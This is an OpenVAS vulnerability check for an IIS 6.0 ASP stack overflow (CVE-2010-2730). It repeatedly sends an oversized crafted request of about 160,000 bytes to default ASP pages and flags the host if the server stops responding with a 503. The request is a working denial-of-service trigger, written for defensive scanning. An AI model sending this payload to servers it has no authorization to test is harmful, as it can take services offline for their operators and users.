###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_ms_iis_bof_vuln.nasl 8250 2017-12-27 07:29:15Z teissa $
#
# Microsoft IIS ASP Stack Based Buffer Overflow Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation will let the remote unauthenticated attackers to force
  the IIS server to become unresponsive until the IIS service is restarted manually
  by the administrator.
  Impact Level: Application";
tag_affected = "Microsoft Internet Information Services version 6.0";
tag_insight = "The flaw is due to a stack overflow error in the in the IIS worker
  process which can be exploited using a crafted POST request to hosted 'ASP'
  pages.";
tag_solution = "Run Windows Update and update the listed hotfixes or download and
  update mentioned hotfixes in the advisory from the below link,
  http://www.microsoft.com/technet/security/bulletin/ms10-065.mspx";
tag_summary = "The host is running Microsoft IIS Webserver and is prone to
  stack based buffer overflow vulnerability.";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.801520");
  script_version("$Revision: 8250 $");
  script_tag(name:"last_modification", value:"$Date: 2017-12-27 08:29:15 +0100 (Wed, 27 Dec 2017) $");
  script_tag(name:"creation_date", value:"2010-10-08 08:29:14 +0200 (Fri, 08 Oct 2010)");
  script_bugtraq_id(43138);
  script_cve_id("CVE-2010-2730");
  script_tag(name:"cvss_base", value:"9.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:C/I:C/A:C");
  script_name("Microsoft IIS ASP Stack Based Buffer Overflow Vulnerability");
  script_xref(name : "URL" , value : "http://bug.zerobox.org/show-2780-1.html");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/15167/");
  script_xref(name : "URL" , value : "http://www.deltadefensesystems.com/blog/?p=217");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (c) 2010 Greenbone Networks GmbH");
  script_family("Web Servers");
  script_dependencies("secpod_ms_iis_detect.nasl");
  script_require_ports("Services/www", 80);
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  exit(0);
}


include("http_func.inc");

iisPort = get_http_port(default:80);
if(!iisPort){
  exit(0);
}

iisVer = get_kb_item("IIS/" + iisPort + "/Ver");
if(!iisVer){
  exit(0);
}

if(!safe_checks()){
  exit(0);
}

## checking for possible default files
foreach files (make_list("login.asp", "index.asp", "default.asp"))
{
  for(i=0; i<10; i++)
  {
    ## Construct the request
    string = crap(data:"C=A&", length:160000);

    ## send the crafted request multiple times
    request = string("HEAD /", files, " HTTP/1.1 \r\n",
                     "Host: ", get_host_name(), "\r\n",
                     "Connection:Close \r\n",
                     "Content-Type: application/x-www-form-urlencoded \r\n",
                     "Content-Length:", strlen(string),"\r\n\r\n", string);
    response = http_send_recv(port:iisPort, data:request);

    ## Check the service status after exploit
    if(ereg(pattern:"^HTTP/[0-9]\.[0-9] 503 .*", string:response) &&
                    ("Service Unavailable" >< response))
    {
      security_message(port:iisPort);
      exit(0);
    }
  }
}
